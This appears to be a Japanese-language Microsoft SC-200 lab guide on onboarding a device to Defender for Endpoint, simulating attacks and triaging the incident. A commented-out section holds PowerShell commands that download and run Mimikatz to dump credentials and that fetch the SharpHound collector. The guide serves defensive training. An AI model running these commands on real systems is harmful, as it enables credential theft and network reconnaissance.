---
lab:
  title: 演習 2 - Microsoft Defender for Endpoint を使用した攻撃の軽減
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# ラーニング パス 2 - ラボ 1 - 演習 2 - Microsoft Defender for Endpoint を使用した攻撃の軽減

## ラボのシナリオ

![ラボの概要。](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

あなたは Microsoft Defender for Endpoint を実装している企業で働いているセキュリティ運用アナリストです。 あなたの上司は、いくつかのデバイスをオンボードして、セキュリティ オペレーション (SecOps) チームの応答手順で必要な変更に関する情報を提供しようとしています。

Defender for Endpoint の攻撃緩和機能を確認するため、シミュレーション攻撃を 2 回行います。

>**メモ:** このラボをご自分のペースでクリックして進めることができる、 **[ラボの対話型シミュレーション](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** が用意されています。 対話型シミュレーションとホストされたラボの間に若干の違いがある場合がありますが、示されている主要な概念とアイデアは同じです。


### タスク 1: デバイスのオンボードを確認する

このタスクでは、デバイスが正常にオンボードされていることを確認し、テスト アラートを作成します。

1. Microsoft Edge ブラウザーの Microsoft Defender XDR ポータルにまだアクセスしていない場合は、(https://security.microsoft.com) に移動して、お使いになっているテナントの管理者としてログインします。

1. 左側のメニューの **[アセット]** 領域の下で **[デバイス]** を選択します。 [デバイス] ページに WIN1 が表示されるまで待ち続けます。 そうしないと、後で生成されるアラートを表示するために、このタスクを繰り返さなければならなくなる可能性があります。

    >**注:**  オンボード プロセスを完了してから 1 時間経ってもデバイス一覧にデバイスが表示されない場合は、オンボードまたは接続に問題があるおそれがあります。

1. 左側のメニュー バーから **[設定]** を選択し、設定 ページから **[エンドポイント]** を選択します。

1. [デバイス管理] セクションで **[オンボード]** を選択し、 *[Windows 10 と 11]* がオペレーティング システムとして選択されていることを確認します。 *"最初のデバイスがオンボードされました"* というメッセージが *[完了]* と表示されるようになります。

1. 下にスクロールし、セクション *[2. 検出テストを実行します]* の下で **[コピー]** ボタンを選択して、検出テストのスクリプトをコピーします。  

1. WIN1 仮想マシンの Windows 検索バーで「**CMD**」と入力し、コマンド プロンプト アプリの右側のペインで **[管理者として実行]** を選択します。 

1. [ユーザー アカウント制御] ウィンドウが表示されたら **[はい]** を選択し、アプリの実行を許可します。 

1. **[管理者: コマンド プロンプト]** ウィンドウでスクリプトを右クリックして貼り付け、**Enter** キーを押して実行します。

    >**注:**  スクリプトの実行後、ウィンドウは自動的に閉じます。

### タスク 2: シミュレーション攻撃

>**注:**  ポータルの評価ラボおよびチュートリアルとシミュレーションのセクションは使用できなくなりました。 次の手順は、参照目的でのみ記載しています。 攻撃シミュレーションのデモについては、**[対話型ラボ シミュレーション](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** を参照してください。 現在、攻撃シミュレーションの代替機能を模索しているところです。

<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.

`Attack 1: Mimikatz - Credential Dumping`

1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.

1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.

1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.

`Attack 2: Bloodhound - Collection`

1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.

1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.

1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.

1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->

1. 左側のメニューの **[エンドポイント]** の下で、 **[評価とチュートリアル]** を選択し、左側から **[チュートリアルとシミュレーション]** を選択します。

1. **[チュートリアル]** タブを選択します。

1. *[Automated investigation (backdoor)](自動調査 (バックドア))* に、シナリオを説明するメッセージが表示されます。 この段落の下にある **[Read the walkthrough](チュートリアルの読み取り)** をクリックします。 シミュレーションを実行する手順を含む新しいブラウザー タブが開きます。

1. 新しいブラウザー タブで、 **[シミュレーションの実行]** という名前のセクション (5 ページの手順 2 から) を見つけ、次の手順に従って攻撃を実行します。 **ヒント:** シミュレーション ファイル *RS4_WinATP-Intro-Invoice.docm* は、ポータルに戻り、 **[Get simulation file](シミュレーション ファイルの取得)** ボタンを選択して、前の手順で選択した **[Read the walkthrough](チュートリアルを読み取る)** の下に表示されます。

<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->

### タスク 3: 攻撃を調査する

1. Microsoft Defender XRD ポータルで、左側のメニュー バーから **[インシデントとアラート]** を選び、**[インシデント]** を選びます。

1. [Multiple threat families detected on one endpoint]\(1 つのエンドポイントで複数の脅威ファミリが見つかりました\) という新しいインシデントが右側のウィンドウに表示されています。 インシデント名を選択して詳細を読み込みます。

    >**注:**  **[アラート]** ウィンドウに、"Bloodhound" と Mimikatz* の両方のアラートが表示されます。** **[Assets/Devices]\(資産/デバイス\)** では、"WIN1" コンピューターの **[リスク レベル]** が [高] になります。****

1. **[インシデントの管理]** ボタンを選択すると、新しいウィンドウ ブレードが表示されます。 

1. **[Incident tags]\(インシデント タグ\)** に「Simulation」と入力し、**[Simulation (Create new)]\(シミュレーション (新規作成)\)** を選んで新しいタグを作成します。 

1. **[割り当て先]** トグルを選択して、インシデントの所有者として自分のユーザー アカウント (Me) を追加します。 

1. **[分類]** で、ドロップダウン メニューを展開します。 

1. **[情報、予期されるアクティビティ]** で、 **[セキュリティ テスト]** を選択します。 

1. 必要に応じてコメントを追加し、 **[保存]** を選択してインシデントを更新し、完了します。

1. *[Attack story] (攻撃ストーリー)、[アラート]、[資産]、[調査]、[Evidence and Response] (証拠と応答)* 、および *[概要]* タブの内容を確認します。 デバイスとユーザーは *[資産]* タブにあります。 *[Attack story] (攻撃ストーリー)* タブには "インシデント グラフ" が表示されます。** **ヒント:** 一部のタブは、ディスプレイのサイズが原因で非表示になる場合があります。 省略記号タブ (...) を選択して表示します。

    >**警告:** ここでのシミュレーション攻撃は、実践を通して学ぶための優れた情報源です。 コースで提供される Azure テナントを使用する場合は、このラボで提供されている手順で推奨されている攻撃のみを実行してください。  他のシミュレーション攻撃は、このテナントでこのトレーニング コースが完了した "後" に実行できます。**

## これでラボは完了です。
